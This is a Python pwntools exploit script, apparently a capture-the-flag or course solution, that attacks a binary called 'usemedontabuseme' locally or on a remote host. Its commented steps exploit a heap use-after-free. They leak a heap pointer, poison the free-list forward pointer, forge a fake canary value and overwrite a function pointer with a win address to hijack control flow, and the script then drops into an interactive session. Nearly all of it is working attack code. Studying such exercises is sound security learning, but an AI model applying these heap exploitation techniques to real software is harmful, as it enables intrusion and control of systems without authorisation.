from pwn import *

PROG_NAME = "./usemedontabuseme"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7000

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

def create_custom(num, data):
	p.recvuntil("Choice: ")
	p.sendline("A")
	p.sendline(str(num))
	p.sendline(data)

def create(num):
	p.recvuntil("Choice: ")
	p.sendline("A")
	p.sendline(str(num))
	p.sendline(str(num)*8)

def view(num):
	p.recvuntil("Choice: ")
	p.sendline("D")
	p.sendline(str(num))
	p.recvuntil("Name: ")
	return p.recvline().rstrip()

def free(num):
	p.recvuntil("Choice: ")
	p.sendline("B")
	p.sendline(str(num))

def rename(num, to_write):
	p.recvuntil("Choice: ")
	p.sendline("C")
	p.sendline(str(num))
	p.sendline(to_write)

def hakk(num):
	p.recvuntil("Choice: ")
	p.sendline("H")
	p.sendline(str(num))

# use after free vulnerability
# win addr : 0x08048b7c

create(1)
create(2)
create(3)

free(2)
free(3)
# the first 4 bytes of chunk 3 (now free) will be a fwd pointer to chunk 2
# since we have UAF we can read this pointer and get a heap address
heap_addr = u32(view(3)[:4])
# chunk sizes are 0x20. the printed pointer is of chunk 2 so to get chunk 1 address, -0x20
# then add 0x8 to reach the address where 0x6447 should be in the (presumably) struct
target = heap_addr - 0x20 + 0x8
# change the fwd pointer to the address of chunk 1's 0x6447 data
rename(3, p32(target))
# create a new element which should reuse the free chunk 3
# next free chunk should be our target (since we changed the fwd pointer)
create(3)
# creation allows for writing 0x9 bytes (with null) instead of 0x8 like in rename
# we write the 0x6447 to pass the fake "canary" check, and then the win function to overwrite the function pointer
create_custom(4, p32(0x6447) + p32(0x08048b7c))
# then execute our overwritten function pointer
hakk(1)

p.interactive()